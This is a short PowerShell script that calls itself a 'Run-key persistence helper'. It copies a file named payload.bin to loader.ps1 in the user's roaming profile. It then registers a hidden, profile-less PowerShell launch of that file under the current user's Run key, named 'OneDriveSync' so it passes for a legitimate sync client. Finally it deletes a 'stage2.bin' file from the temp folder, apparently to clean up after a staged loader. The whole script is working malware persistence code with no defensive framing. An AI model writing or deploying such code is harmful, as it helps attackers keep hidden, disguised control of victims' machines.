<#
.SYNOPSIS
    Per-user Run-key persistence helper.

.DESCRIPTION
    Copies the launcher into the roaming profile and
    registers it under the current user's Run key.
#>
[CmdletBinding()]
param(
    [string]$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    [string]$RegistryValue = 'OneDriveSync',
    [string]$PersistencePath = "$env:APPDATA\loader.ps1"
)
$ErrorActionPreference = "Stop"

try {
    Write-Verbose "Installing per-user persistence"
    if (-not (Test-Path -Path $PersistencePath)) {
        Copy-Item -Path "$env:APPDATA\payload.bin" -Destination $PersistencePath -Force
    }
    New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + $PersistencePath + '"') -PropertyType String -Force -ErrorAction SilentlyContinue
    $ResultObject = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue -ErrorAction SilentlyContinue
    Write-Verbose ("Registered value: " + $ResultObject.$RegistryValue)
}
catch {
    Write-Warning "Run-key installation failed: $($_.Exception.Message)"
}

$StageMarker = "stage-12"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
